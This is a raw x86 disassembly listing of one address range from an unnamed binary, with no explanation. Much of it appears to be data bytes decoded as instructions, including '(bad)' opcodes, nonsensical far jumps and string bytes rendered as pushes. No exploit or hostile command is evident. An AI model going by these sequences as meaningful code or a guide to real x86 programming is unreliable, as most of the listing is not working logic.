  4217e7:	or     esi,DWORD PTR [edx+0x304e790e]
  4217ed:	dec    esi
  4217ee:	xchg   DWORD PTR [edi+0x3d],ecx
  4217f1:	dec    esi
  4217f2:	scas   eax,DWORD PTR es:[edi]
  4217f3:	dec    edi
  4217f4:	ds dec esi
  4217f6:	js     0x421846
  4217f8:	cmp    ecx,DWORD PTR [esi-0x64]
  4217fb:	dec    edi
  4217fc:	inc    esp
  4217fd:	dec    esi
  4217fe:	jae    0x42184e
  421800:	inc    ecx
  421801:	dec    esi
  421802:	xor    BYTE PTR [esi+0x40],cl
  421805:	dec    esi
  421806:	pop    esp
  421807:	pop    ebp
  421808:	pop    edi
  421809:	push   edx
  42180a:	cmp    DWORD PTR [esi+0x79],ecx
  42180d:	dec    esi
  42180e:	xor    BYTE PTR [esi-0x79],cl
  421811:	dec    edi
  421812:	cmp    eax,0x3e4faf4e
  421817:	dec    esi
  421818:	js     0x421868
  42181a:	cmp    ecx,DWORD PTR [esi-0x64]
  42181d:	dec    edi
  42181e:	inc    esp
  42181f:	dec    esi
  421820:	mov    DWORD PTR [edi+0x41],ecx
  421823:	dec    esi
  421824:	xor    BYTE PTR [esi+0x40],cl
  421827:	dec    esi
  421828:	pop    esp
  421829:	ins    DWORD PTR es:[edi],dx
  42182a:	pop    edi
  42182b:	bound  edi,QWORD PTR [ecx]
  42182d:	dec    esi
  42182e:	jns    0x42187e
  421830:	xor    BYTE PTR [esi-0x80],cl
  421833:	dec    edi
  421834:	cmp    eax,0x394e734e
  421839:	dec    esi
  42183a:	mov    ds:0x304e3a4f,al
  42183f:	dec    esi
  421840:	inc    esi
  421841:	dec    esi
  421842:	pop    esp
  421843:	jge    0x4218a4
  421845:	jb     0x4218b6
  421847:	sub    BYTE PTR [esi-0x7d],0x7e
  42184b:	xchg   ebx,eax
  42184c:	jns    0x4217de
  42184e:	aas    
  42184f:	dec    esi
  421850:	test   BYTE PTR [edi+0x30],cl
  421853:	dec    esi
  421854:	test   BYTE PTR [edi+0x3c],cl
  421857:	dec    esi
  421858:	mov    ds:0x734e394f,al
  42185d:	dec    esi
  42185e:	inc    ebp
  42185f:	dec    esi
  421860:	xor    BYTE PTR [esi+0x44],cl
  421863:	dec    esi
  421864:	pop    esp
  421865:	lea    ebx,[edi-0x7e]
  421868:	outs   dx,DWORD PTR ds:[esi]
  421869:	xchg   edx,eax
  42186a:	outs   dx,BYTE PTR ds:[esi]
  42186b:	xchg   ebx,eax
  42186c:	jle    0x421811
  42186e:	jns    0x421810
  421870:	aas    
  421871:	dec    esi
  421872:	test   BYTE PTR [edi+0x30],cl
  421875:	dec    esi
  421876:	test   BYTE PTR [edi+0x3c],cl
  421879:	dec    esi
  42187a:	mov    ds:0x894e394f,al
  42187f:	dec    edi
  421880:	inc    ebp
  421881:	dec    esi
  421882:	xor    BYTE PTR [esi+0x44],cl
  421885:	dec    esi
  421886:	pop    esp
  421887:	popf   
  421888:	pop    edi
  421889:	xchg   edx,eax
  42188a:	outs   dx,DWORD PTR ds:[esi]
  42188b:	mov    ds:0xb37ea36e,al
  421890:	jns    0x421842
  421892:	aas    
  421893:	dec    esi
  421894:	mov    cs,WORD PTR [edi+0x30]
  421897:	dec    esi
  421898:	lods   al,BYTE PTR ds:[esi]
  421899:	dec    edi
  42189a:	cmp    eax,0x394e734e
  42189f:	dec    esi
  4218a0:	mov    eax,ds:0x304e3a4f
  4218a5:	dec    esi
  4218a6:	inc    esp
  4218a7:	dec    esi
  4218a8:	pop    esp
  4218a9:	lods   eax,DWORD PTR ds:[esi]
  4218aa:	pop    edi
  4218ab:	mov    ds:0xb36eb26f,al
  4218b0:	jle    0x421875
  4218b2:	jns    0x421874
  4218b4:	aas    
  4218b5:	dec    esi
  4218b6:	mov    cs,WORD PTR [edi+0x30]
  4218b9:	dec    esi
  4218ba:	lods   al,BYTE PTR ds:[esi]
  4218bb:	dec    edi
  4218bc:	cmp    eax,0x394e7e4e
  4218c1:	dec    esi
  4218c2:	lahf   
  4218c3:	dec    edi
  4218c4:	cmp    ecx,DWORD PTR [esi+0x30]
  4218c7:	dec    esi
  4218c8:	inc    ebp
  4218c9:	dec    esi
  4218ca:	pop    esp
  4218cb:	mov    ebp,0xc26fb25f
  4218d0:	outs   dx,BYTE PTR ds:[esi]
  4218d1:	ret    
  4218d2:	jle    0x4218a7
  4218d4:	jns    0x4218a6
  4218d6:	aas    
  4218d7:	dec    esi
  4218d8:	mov    cs,WORD PTR [edi+0x30]
  4218db:	dec    esi
  4218dc:	lods   al,BYTE PTR ds:[esi]
  4218dd:	dec    edi
  4218de:	cmp    eax,0x394f804e
  4218e3:	dec    esi
  4218e4:	lods   al,BYTE PTR ds:[esi]
  4218e5:	dec    edi
  4218e6:	cmp    cl,BYTE PTR [esi+0x30]
  4218e9:	dec    esi
  4218ea:	inc    esi
  4218eb:	dec    esi
  4218ec:	pop    esp
  4218ed:	int    0x5f
  4218ef:	ret    0xd26f
  4218f2:	outs   dx,BYTE PTR ds:[esi]
  4218f3:	sar    DWORD PTR [esi-0x1d],cl
  4218f6:	jns    0x4218d8
  4218f8:	aas    
  4218f9:	dec    esi
  4218fa:	mov    cs,WORD PTR [edi+0x30]
  4218fd:	dec    esi
  4218fe:	lods   al,BYTE PTR ds:[esi]
  4218ff:	dec    edi
  421900:	cmp    eax,0x394f834e
  421905:	dec    esi
  421906:	mov    ds:0x304e3a4f,al
  42190b:	dec    esi
  42190c:	inc    esp
  42190d:	dec    esi
  42190e:	pop    esp
  42190f:	fstp   QWORD PTR [edi-0x2e]
  421912:	outs   dx,DWORD PTR ds:[esi]
  421913:	loop   0x421983
  421915:	jecxz  0x421995
  421917:	repz jns 0x42190a
  42191a:	aas    
  42191b:	dec    esi
  42191c:	lea    ecx,[edi+0x30]
  42191f:	dec    esi
  421920:	lahf   
  421921:	dec    edi
  421922:	cmp    eax,0x3c4fa04e
  421927:	dec    esi
  421928:	xor    BYTE PTR [esi+0x3f],cl
  42192b:	dec    esi
  42192c:	pop    esp
  42192d:	in     eax,dx
  42192e:	pop    edi
  42192f:	loop   0x4219a0
  421931:	repnz outs dx,BYTE PTR ds:[esi]
  421933:	repz jle 0x421939
  421936:	jns    0x421938
  421938:	jle    0x42194d
  42193a:	jns    0x42194c
  42193c:	cmp    al,0x4e
  42193e:	jg     0x42198e
  421940:	xor    BYTE PTR [esi-0x65],cl
  421943:	dec    edi
  421944:	xor    cl,BYTE PTR [esi-0x80]
  421947:	dec    edi
  421948:	cmp    al,0x4e
  42194a:	lods   eax,DWORD PTR ds:[esi]
  42194b:	dec    edi
  42194c:	cmp    ecx,DWORD PTR [esi+0x30]
  42194f:	dec    esi
  421950:	inc    ebp
  421951:	dec    esi
  421952:	pop    esp
  421953:	or     eax,0x126f025f
  421958:	outs   dx,BYTE PTR ds:[esi]
  421959:	adc    edi,DWORD PTR [esi+0x23]
  42195c:	jns    0x42197e
  42195e:	aas    
  42195f:	dec    esi
  421960:	add    BYTE PTR [eax],al
  421962:	jmp    0x4219:0xde004217
  421969:	add    dh,ah
  42196b:	sbb    DWORD PTR [edx+0x0],eax
  42196e:	mov    ds,WORD PTR [ebx]
  421970:	inc    edx
  421971:	add    dl,bh
  421973:	sbb    al,BYTE PTR [edx+0x0]
  421976:	jle    0x421993
  421978:	inc    edx
  421979:	add    dh,al
  42197b:	sbb    DWORD PTR [edx+0x0],eax
  42197e:	retf   0x4219
  421981:	add    BYTE PTR [edx+0x1b],bh
  421984:	inc    edx
  421985:	add    BYTE PTR [esi],ch
  421987:	sbb    al,BYTE PTR [edx+0x0]
  42198a:	or     eax,0x36f89ca9
  42198f:	mov    edx,0x19e2f89c
  421994:	inc    edx
  421995:	add    BYTE PTR [edx-0x39ffbde6],dh
  42199b:	sbb    al,BYTE PTR [edx+0x0]
  42199e:	rcr    BYTE PTR [edx],cl
  4219a0:	inc    edx
  4219a1:	add    dl,ah
  4219a3:	sbb    al,BYTE PTR [edx+0x0]
  4219a6:	sbb    bl,BYTE PTR [edx]
  4219a8:	inc    edx
  4219a9:	add    dh,ah
  4219ab:	pop    ss
  4219ac:	inc    edx
  4219ad:	add    BYTE PTR [edx],bh
  4219af:	sbb    al,BYTE PTR [edx+0x0]
  4219b2:	sub    bl,BYTE PTR [edx]
  4219b4:	inc    edx
  4219b5:	add    BYTE PTR [edx-0x49ffbde5],dl
  4219bb:	test   DWORD PTR [eax+edi*8-0x7ee8f4e7],ebx
  4219c2:	out    dx,al
  4219c3:	sbb    DWORD PTR [edx+0x0],eax
  4219c6:	adc    al,0x1c
  4219c8:	push   ss
  4219c9:	or     DWORD PTR [eax],0x7050d
  4219cf:	add    BYTE PTR [eax+0x0],al
  4219d2:	cmp    al,BYTE PTR [edx+0x3e]
  4219d5:	ds enter 0x4279,0x0
  4219da:	ins    DWORD PTR es:[edi],dx
  4219db:	push   ebp
  4219dc:	inc    esp
  4219dd:	imul   ecx,DWORD PTR [eax],0x86275fa
  4219e3:	in     eax,dx
  4219e4:	inc    BYTE PTR [edi]
  4219e6:	aas    
  4219e7:	cli    
  4219e8:	mov    ds:0x4219d605,eax
  4219ed:	add    BYTE PTR [ebp-0x4a07636b],dh
  4219f3:	xchg   esi,eax
  4219f4:	pushf  
  4219f5:	clc    
  4219f6:	mov    ah,0x95
  4219f8:	pushf  
  4219f9:	clc    
  4219fa:	mov    ebx,0xbaf89c95
  4219ff:	xchg   ebp,eax
  421a00:	pushf  
  421a01:	clc    
  421a02:	mov    ecx,0xb8f89c95
  421a07:	xchg   ebp,eax
  421a08:	pushf  
  421a09:	clc    
  421a0a:	mov    edi,0xbef89c95
  421a0f:	xchg   ebp,eax
  421a10:	pushf  
  421a11:	clc    
  421a12:	mov    ebp,0xa6f89c95
  421a17:	xchg   ebp,eax
  421a18:	pushf  
  421a19:	clc    
  421a1a:	jmp    0x4217:0xde6003f9
  421a21:	add    BYTE PTR [eax+eax*2+0x42],ch
  421a25:	add    BYTE PTR [ebx+0x77],dl
  421a28:	jbe    0x421a7a
  421a2a:	mov    dh,0x85
  421a2c:	pushf  
  421a2d:	clc    
  421a2e:	sbb    ecx,ebp
  421a30:	push   eax
  421a31:	pop    es
  421a32:	dec    eax
  421a33:	or     al,BYTE PTR [eax]
  421a35:	add    dl,bl
  421a37:	pop    ss
  421a38:	inc    edx
  421a39:	add    BYTE PTR [ebx],bl
  421a3b:	or     eax,DWORD PTR [esi+ecx*1]
	...
  421a6e:	ins    BYTE PTR es:[edi],dx
  421a6f:	inc    eax
  421a70:	inc    edx
  421a71:	add    BYTE PTR [esi+0x66f89c85],dh
  421a77:	add    BYTE PTR [edx+0x0],ch
  421a7a:	add    BYTE PTR [si+0x0],ah
  421a7e:	push   0x64006700
  421a83:	add    BYTE PTR [esi+0x0],ah
  421a86:	push   0x0
  421a88:	push   0x66006400
  421a8d:	add    BYTE PTR [edi+0x0],ah
  421a90:	push   0x0
  421a92:	push   0x66006700
  421a97:	add    BYTE PTR [eax+0x0],ch
  421a9a:	add    BYTE PTR [bp+0x0],ah
  421a9e:	push   0x66006700
	...
  421aab:	add    BYTE PTR [eax],al
  421aad:	add    BYTE PTR [edi+0x5c],ch
  421ab0:	inc    eax
  421ab1:	add    BYTE PTR [ebp-0x5db060b1],ah
  421ab7:	dec    edi
  421ab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ab9:	dec    edi
  421aba:	lahf   
  421abb:	dec    edi
  421abc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421abd:	dec    edi
  421abe:	ins    DWORD PTR es:[edi],dx
  421abf:	dec    esi
  421ac0:	bound  ecx,QWORD PTR [esi+0x30]
  421ac3:	dec    esi
  421ac4:	add    BYTE PTR [eax],al
  421ac6:	cdq    
  421ac7:	dec    edi
  421ac8:	pushf  
  421ac9:	dec    edi
  421aca:	fwait
  421acb:	dec    edi
  421acc:	ins    DWORD PTR es:[edi],dx
  421acd:	dec    esi
  421ace:	bound  ecx,QWORD PTR [esi+0x30]
  421ad1:	dec    esi
  421ad2:	scas   eax,DWORD PTR es:[edi]
  421ad3:	dec    edi
  421ad4:	lods   eax,DWORD PTR ds:[esi]
  421ad5:	dec    edi
  421ad6:	lahf   
  421ad7:	dec    edi
  421ad8:	mov    ds:0x624e6d4f,al
  421add:	dec    esi
  421ade:	xor    BYTE PTR [esi+0x0],cl
  421ae1:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421ae7:	dec    edi
  421ae8:	test   eax,0xa04f934f
  421aed:	dec    edi
  421aee:	fwait
  421aef:	dec    edi
  421af0:	xor    BYTE PTR [esi+0x0],cl
  421af3:	add    BYTE PTR [eax],al
  421af5:	add    BYTE PTR [eax],al
  421af7:	add    BYTE PTR [eax],al
  421af9:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421b00:	mov    WORD PTR [ebp-0x32734274],gs
  421b06:	mov    ebp,ds
  421b08:	mov    ebp,gs
  421b0a:	mov    ebp,?
  421b0c:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421b12:	mov    WORD PTR ds:0x6d8c5d8c,?
  421b18:	mov    WORD PTR [edx-0x74],?
  421b1b:	jae    0x421aa9
  421b1d:	jo     0x421aab
  421b1f:	jno    0x421aad
  421b21:	jbe    0x421aaf
  421b23:	ja     0x421ab1
  421b25:	je     0x421ab3
  421b27:	jne    0x421ab5
  421b29:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421b30:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421b36:	lods   al,BYTE PTR ds:[esi]
  421b37:	jge    0x421af5
  421b39:	jge    0x421ad9
  421b3b:	(bad)  
  421b3c:	jns    0x421bb1
  421b3e:	mov    ecx,0x7d738cb1
  421b43:	ins    DWORD PTR es:[edi],dx
  421b44:	enter  0x9fc6,0x26
  421b48:	jb     0x421b4d
  421b4a:	test   eax,0xb956bb17
  421b4f:	hlt    
  421b50:	test   al,0x37
  421b52:	test   al,0x7e
  421b54:	fnstenv [ecx-0x6a]
  421b57:	mov    cl,0x6a
  421b59:	push   0xffffffce
  421b5b:	or     BYTE PTR [edx],bl
  421b5d:	xlat   BYTE PTR ds:[ebx]
  421b5e:	out    dx,eax
  421b5f:	add    eax,0x9321d7aa
  421b64:	scas   al,BYTE PTR es:[edi]
  421b65:	adc    DWORD PTR [esi],esp
  421b67:	jge    0x421b8c
  421b69:	fidiv  WORD PTR [edi]
  421b6b:	leave  
  421b6c:	hlt    
  421b6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b6e:	cmp    ax,0x1fc8
  421b72:	mov    dh,cl
  421b74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b75:	(bad)  
  421b76:	and    DWORD PTR [eax],ebx
  421b78:	and    DWORD PTR [ecx-0x18],esi
  421b7b:	(bad)  [ebx+0x7]
  421b7e:	cmc    
  421b7f:	enter  0x301a,0x14
  421b83:	inc    eax
  421b84:	inc    edx
  421b85:	add    BYTE PTR [ecx+0x66],dh
  421b88:	jp     0x421bf8
  421b8a:	into   
  421b8b:	sbb    DWORD PTR [edx+0x0],eax
  421b8e:	xor    bl,BYTE PTR [edx]
  421b90:	inc    edx
  421b91:	add    BYTE PTR [eax],cl
  421b93:	in     eax,dx
  421b94:	adc    al,BYTE PTR [edi]
  421b96:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421b9d:	ins    BYTE PTR es:[edi],dx
  421b9e:	push   0x49657557
  421ba3:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421ba9:	push   edi
  421baa:	jp     0x421c26
  421bac:	dec    ebp
  421bad:	push   esi
  421bae:	arpl   WORD PTR gs:[ecx+0x45],si
  421bb2:	dec    edx
  421bb3:	dec    esi
  421bb4:	data16 ja 0x421c05
  421bb7:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421bd2:	inc    ebp
  421bd3:	push   edx
  421bd4:	jb     0x421c4a
  421bd6:	inc    esi
  421bd7:	je     0x421c1a
  421bd9:	inc    esi
  421bda:	jae    0x421c52
  421bdc:	dec    ebx
  421bdd:	gs dec ecx
  421bdf:	dec    ebp
  421be0:	dec    ebp
  421be1:	pop    edx
  421be2:	jp     0x421c3e
  421be4:	jbe    0x421c2c
  421be6:	pop    ecx
  421be7:	jo     0x421c61
  421be9:	inc    edi
  421bea:	gs ins BYTE PTR es:[edi],dx
  421bec:	dec    esp
  421bed:	js     0x421c57
  421bef:	inc    edx
  421bf0:	js     0x421c38
  421bf2:	dec    eax
  421bf3:	inc    ebp
  421bf4:	inc    esp
  421bf5:	inc    esp
  421bf6:	push   ecx
  421bf7:	dec    edx
  421bf8:	ins    BYTE PTR es:[edi],dx
  421bf9:	dec    ebx
  421bfa:	jbe    0x421c6a
  421bfc:	pop    eax
  421bfd:	jbe    0x421c4a
  421bff:	inc    ecx
  421c00:	fs gs jno 0x421c71
  421c04:	push   ebx
  421c05:	inc    ecx
  421c06:	add    BYTE PTR [eax],al
  421c08:	inc    ebx
  421c09:	outs   dx,BYTE PTR ds:[esi]
  421c0a:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421c0e:	push   edx
  421c0f:	push   ecx
  421c10:	push   0x74000064
  421c15:	jne    0x421c8c
  421c17:	ins    DWORD PTR es:[edi],dx
  421c18:	push   ecx
  421c19:	push   eax
  421c1a:	jo     0x421c96
  421c1c:	addr16 jo 0x421c75
  421c1f:	pop    eax
  421c20:	add    BYTE PTR [eax],al
  421c22:	push   ecx
  421c23:	pop    ecx
  421c24:	inc    ebx
  421c25:	inc    edx
  421c26:	outs   dx,BYTE PTR ds:[esi]
  421c27:	popa   
  421c28:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421c2c:	jne    0x421c9c
  421c2e:	dec    ebx
  421c2f:	je     0x421c94
  421c31:	bound  esp,QWORD PTR [edi+0x0]
  421c34:	jns    0x421c7b
  421c36:	bound  ebp,QWORD PTR [ecx+0x46]
  421c39:	dec    ecx
  421c3a:	ja     0x421c81
  421c3c:	dec    eax
  421c3d:	inc    ebp
  421c3e:	inc    edx
  421c3f:	push   ebx
  421c40:	add    BYTE PTR [eax],al
  421c42:	outs   dx,DWORD PTR ds:[esi]
  421c43:	inc    edi
  421c44:	dec    esi
  421c45:	outs   dx,DWORD PTR ds:[esi]
  421c46:	pop    ecx
  421c47:	inc    edi
  421c48:	jb     0x421c91
  421c4a:	jns    0x421cc2
  421c4c:	inc    ecx
  421c4d:	pop    eax
  421c4e:	dec    esp
  421c4f:	add    BYTE PTR [eax+0x48],bh
  421c52:	bound  edx,QWORD PTR [ebx+0x43]
  421c55:	pop    eax
  421c56:	outs   dx,DWORD PTR ds:[esi]
  421c57:	push   0x4355
  421c5c:	dec    esp
  421c5d:	ins    BYTE PTR es:[edi],dx
  421c5e:	inc    edx
  421c5f:	push   0x76666a73
  421c64:	inc    edx
  421c65:	jo     0x421c67
  421c67:	add    BYTE PTR [eax],al
  421c69:	add    BYTE PTR [edi+0x6d],ah
  421c6c:	je     0x421cb5
  421c6e:	ins    BYTE PTR es:[edi],dx
  421c6f:	jae    0x421cdb
  421c71:	inc    esi
  421c72:	ins    DWORD PTR es:[edi],dx
  421c73:	je     0x421ccb
  421c75:	push   0x56584178
  421c7a:	push   ebx
  421c7b:	addr16 dec edx
  421c7d:	jo     0x421cf1
  421c7f:	js     0x421cf0
  421c81:	pop    eax
  421c82:	dec    ebx
  421c83:	push   esp
  421c84:	dec    esp
  421c85:	jns    0x421cd2
  421c87:	js     0x421d01
  421c89:	outs   dx,BYTE PTR ds:[esi]
  421c8a:	pop    ecx
  421c8b:	jae    0x421cfb
  421c8d:	push   0x43644448
  421c92:	arpl   WORD PTR [edx+0x55],sp
  421c95:	push   0x42504e67
  421c9a:	push   ebp
  421c9b:	je     0x421d12
  421c9d:	addr16 dec edi
  421c9f:	dec    esp
  421ca0:	inc    edx
  421ca1:	ins    DWORD PTR es:[edi],dx
  421ca2:	inc    esi
  421ca3:	inc    esi
  421ca4:	inc    esi
  421ca5:	arpl   WORD PTR [edx+0x47],bx
  421ca8:	push   ebp
  421ca9:	inc    ebx
  421caa:	popa   
  421cab:	push   edx
  421cac:	dec    esp
  421cad:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421cb4:	push   ecx
  421cb5:	push   ebx
  421cb6:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421cbd:	dec    edx
  421cbe:	jns    0x421d29
  421cc0:	push   edx
  421cc1:	inc    ebx
  421cc2:	jo     0x421d39
  421cc4:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421cc8:	fs push ebx
  421cca:	inc    ebx
  421ccb:	push   ebp
  421ccc:	push   eax
  421ccd:	ja     0x421d0a
  421ccf:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421cd3:	mov    ebp,0xa53ddffb
  421cd8:	js     0x421c93
  421cda:	pop    esp
  421cdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cdc:	xchg   DWORD PTR [edi-0x4a],ecx
  421cdf:	aad    0x1
  421ce1:	add    BYTE PTR [ecx+0x0],ah
  421ce4:	add    BYTE PTR [eax],al
  421ce6:	les    edi,FWORD PTR [ebp+0xbad0949]
  421cec:	dec    ecx
  421ced:	mov    bl,0x35
  421cef:	adc    dh,BYTE PTR [esi]
  421cf1:	and    eax,0xa41b6e87
  421cf6:	outs   dx,DWORD PTR ds:[esi]
  421cf7:	dec    ebx
  421cf8:	sbb    bh,BYTE PTR [ebp+0x41274cd1]
  421cfe:	jno    0x421d60
  421d00:	pop    ebp
  421d01:	or     cl,BYTE PTR [ebx-0x630d399b]
  421d07:	jp     0x421d4e
  421d09:	lds    esi,FWORD PTR [edx-0x7c36e894]
  421d0f:	inc    eax
  421d10:	retf   0x54f0
  421d13:	test   eax,0x413196e2
  421d18:	icebp  
  421d19:	jg     0x421ca7
  421d1b:	retf   
  421d1c:	add    DWORD PTR [edi],ecx
  421d1e:	cmp    eax,0x7c814989
  421d23:	cmc    
  421d24:	div    BYTE PTR [eax+eax*4+0x57]
  421d28:	sub    eax,0x50ce7c00
  421d2d:	xchg   cx,ax
  421d2f:	repz mov ds:0x84786dea,eax
  421d35:	std    
  421d36:	sbb    BYTE PTR [ebx-0x71],bl
  421d39:	aas    
  421d3a:	dec    esp
  421d3b:	outs   dx,BYTE PTR ds:[esi]
  421d3c:	ins    BYTE PTR es:[edi],dx
  421d3d:	mov    edx,0xdc07e980
  421d42:	inc    edi
  421d43:	in     eax,dx
  421d44:	iret   
  421d45:	push   ebp
  421d46:	mov    ds:0x0,al
  421d4b:	add    BYTE PTR [eax],al
  421d4d:	add    BYTE PTR [eax],ch
  421d4f:	mov    dl,0xa5
  421d51:	push   edx
  421d52:	mov    edi,0x7cfaff57
  421d57:	xlat   BYTE PTR fs:[ebx]
  421d59:	push   esi
  421d5a:	cmp    al,0x18
  421d5c:	aad    0x41
  421d5e:	pop    ss
  421d5f:	(bad)  
  421d60:	add    DWORD PTR [eax],eax
  421d62:	popa   
  421d63:	add    BYTE PTR [eax],al
  421d65:	add    BYTE PTR [ecx+edx*1-0x3bc7e471],dh
  421d6c:	jmp    0x421d52
  421d6e:	xchg   BYTE PTR [esi+0x3c265679],ch
  421d74:	adc    BYTE PTR [ebp+0xc],al
  421d77:	icebp  
  421d78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d7a:	jmp    0xd4b6:0x7e551109
  421d81:	icebp  
  421d82:	push   ebp
  421d83:	mov    bh,0xe4
  421d85:	push   ebx
  421d86:	sahf   
  421d87:	lods   al,BYTE PTR ds:[esi]
  421d88:	stos   BYTE PTR es:[edi],al
  421d89:	push   edi
  421d8a:	hlt    
  421d8b:	call   0xb17c4dba
  421d90:	outs   dx,BYTE PTR ds:[esi]
  421d91:	lods   al,BYTE PTR ds:[esi]
  421d92:	mov    ds:0xb79a4fb6,al
  421d97:	sahf   
  421d98:	jg     0x421d70
  421d9a:	hlt    
  421d9b:	sub    ebp,DWORD PTR [ecx-0x2f]
  421d9e:	add    edi,edi
  421da0:	je     0x421d98
  421da2:	push   esp
  421da3:	dec    esp
  421da4:	sbb    eax,0x8a9c3ea8
  421da9:	mov    esp,0x475e1e83
  421dae:	fidivr DWORD PTR [esi+0x2]
  421db1:	mov    edx,0x5b8d934
  421db6:	dec    ebx
  421db7:	jbe    0x421d7d
  421db9:	push   edx
  421dba:	addr16 xchg edi,eax
  421dbc:	daa    
  421dbd:	lock ret 0x6d9f
  421dc1:	cmp    BYTE PTR [esi+0xc],bh
  421dc4:	cdq    
  421dc5:	or     dh,BYTE PTR [eax+0x0]
  421dc8:	add    BYTE PTR [eax],al
  421dca:	add    BYTE PTR [eax],al
  421dcc:	add    BYTE PTR [eax],al
  421dce:	mov    bl,0x55
  421dd0:	jg     0x421d53
  421dd2:	jmp    FWORD PTR [ebx-0x69418801]
  421dd8:	push   0xbb877457
  421ddd:	cld    
  421dde:	js     0x421db6
  421de0:	add    DWORD PTR [eax],eax
  421de2:	popa   
  421de3:	add    BYTE PTR [eax],al
  421de5:	add    BYTE PTR [ebp-0x6c],ch
  421de8:	out    dx,eax
  421de9:	add    cl,BYTE PTR [eax+0x5c8c0235]
  421def:	lods   eax,DWORD PTR ds:[esi]
  421df0:	and    al,0x63
  421df2:	jne    0x421dab
  421df4:	in     eax,0xd
  421df6:	and    DWORD PTR [edx+0x64],esi
  421df9:	mov    ds,WORD PTR [esi]
  421dfb:	push   esp
  421dfc:	and    dl,bh
  421dfe:	jmp    0xc733:0x4eaaa0c4
  421e05:	out    0x45,al
  421e07:	scas   al,BYTE PTR es:[edi]
  421e08:	stos   DWORD PTR es:[edi],eax
  421e09:	mov    ch,BYTE PTR [ecx+ecx*1]
  421e0c:	pushw  es
  421e0e:	inc    edx
  421e0f:	dec    esi
  421e10:	ret    0x1589
  421e13:	ins    DWORD PTR es:[edi],dx
  421e14:	push   eax
  421e15:	scas   al,BYTE PTR es:[edi]
  421e16:	inc    edx
  421e17:	sub    BYTE PTR [ecx],0x7d
  421e1a:	jle    0x421e33
  421e1c:	xor    al,0x7c
  421e1e:	cmc    
  421e1f:	mov    esi,0x888c84a1
  421e24:	das    
  421e25:	and    eax,0xb94dfb37
  421e2a:	pop    ds
  421e2b:	fdivp  st(2),st
  421e2d:	in     eax,dx
  421e2e:	ret    0xa13b
  421e31:	ret    
  421e32:	or     ecx,DWORD PTR [edx]
  421e34:	dec    esi
  421e35:	mov    ch,0x3d
  421e37:	and    ecx,edx
  421e39:	xchg   ebp,eax
  421e3a:	cmc    
  421e3b:	mov    ebx,eax
  421e3d:	adc    DWORD PTR [eax+0x39],edx
  421e40:	cmp    al,0xb9
  421e42:	popf   
  421e43:	pop    ds
  421e44:	aas    
  421e45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e46:	xchg   ecx,eax
  421e47:	add    BYTE PTR [eax],al
  421e49:	add    BYTE PTR [eax],al
  421e4b:	add    BYTE PTR [eax],al
  421e4d:	add    BYTE PTR [eax],bh
  421e4f:	(bad)  
  421e50:	cmp    ah,BYTE PTR [esi+edi*8]
  421e53:	in     al,dx
  421e54:	fimul  WORD PTR ds:[edi-0x3b53942b]
  421e5b:	sar    DWORD PTR [esi+0x1d6d911],cl
  421e61:	add    BYTE PTR [ecx+0x0],ah
  421e64:	add    BYTE PTR [eax],al
  421e66:	int    0xf1
  421e68:	dec    esp
  421e69:	sbb    BYTE PTR [esi-0x5d],cl
  421e6c:	adc    al,0xcc
  421e6e:	int    0xbb
  421e70:	mov    edx,0xaffd7e2f
  421e75:	iret   
  421e76:	sub    al,0xd3
  421e78:	lock test BYTE PTR [ebx-0x7d909957],bh
  421e7f:	xchg   ecx,eax
  421e80:	xor    eax,0x6c503a8a
  421e85:	pop    edi
  421e86:	fst    DWORD PTR [eax]
  421e88:	js     0x421e8c
  421e8a:	sti    
  421e8b:	and    al,BYTE PTR [ebx+0x2c]
  421e8e:	(bad)  
  421e8f:	leave  
  421e90:	push   esi
  421e91:	repz sub BYTE PTR ds:0xa5016c7f,dl
  421e98:	pusha  
  421e99:	aaa    
  421e9a:	xor    BYTE PTR [edx-0x585fbd78],ch
  421ea0:	inc    edx
  421ea1:	inc    esi
  421ea2:	mov    ah,BYTE PTR ds:0xc56a3439
  421ea8:	xchg   cl,al
  421eaa:	addr16 jns 0x421ebf
  421ead:	sar    DWORD PTR [edi+0x287ffd93],1
  421eb3:	sbb    bl,ah
  421eb5:	push   0x3
  421eb7:	mov    esi,DWORD PTR [edx-0x1c]
  421eba:	clc    
  421ebb:	lds    ebp,FWORD PTR [eax+0x4b]
  421ebe:	ret    
  421ebf:	inc    esp
  421ec0:	and    eax,0xd76f0425
  421ec5:	call   0x421ef2
  421eca:	add    BYTE PTR [eax],al
  421ecc:	add    BYTE PTR [eax],al
  421ece:	fnstenv [esi-0x2490e49a]
  421ed4:	std    
  421ed5:	neg    BYTE PTR [esi]
  421ed7:	sub    esp,DWORD PTR [ebx-0x23]
  421eda:	test   BYTE PTR [ebx],ch
  421edc:	cmp    BYTE PTR [ecx],al
  421ede:	cmp    dl,bh
  421ee0:	add    DWORD PTR [eax],eax
  421ee2:	popa   
  421ee3:	add    BYTE PTR [eax],al
  421ee5:	add    BYTE PTR [esi],cl
  421ee7:	mov    ebx,0x25e860f2
  421eec:	out    dx,eax
  421eed:	pop    ds
  421eee:	stos   BYTE PTR es:[edi],al
  421eef:	std    
  421ef0:	lock mov eax,0x4eb231e3
  421ef6:	xchg   esp,eax
  421ef7:	push   ebx
  421ef8:	leave  
  421ef9:	popa   
  421efa:	cmp    edx,ebx
